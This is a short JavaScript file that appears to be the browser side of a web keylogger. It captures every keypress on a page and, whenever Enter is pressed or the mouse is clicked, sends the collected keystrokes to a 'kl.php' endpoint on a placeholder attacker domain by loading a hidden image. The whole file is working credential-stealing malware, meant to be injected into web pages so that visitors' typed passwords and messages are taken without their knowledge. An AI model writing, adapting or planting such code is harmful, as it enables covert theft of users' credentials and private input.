// Enter URL to "kl.php" API Here
var url = 'http://YOUR_DOMAIN_HERE/kl.php?key='
var array = [];

// Pushes Keystrokes to Array
document.onkeypress = function(keypress) {
    var stroke = keypress.key;
    array.push(stroke);
}

// When Enter/Return Key is Pressed, Send Array to PHP API
window.setInterval(function() {
    if (array[array.length-1] == 'Enter') {
        var command = encodeURIComponent(JSON.stringify(array));
        new Image().src = url + command;
        array = [];
    }
}, 100);

// If Mouse is Clicked, Send Array to PHP API
document.body.addEventListener('click', function(){
        if(array.length > 0){
		array.push("Click")
		var command = encodeURIComponent(JSON.stringify(array));
        new Image().src = url + command;
        array = [];}
}, true); 
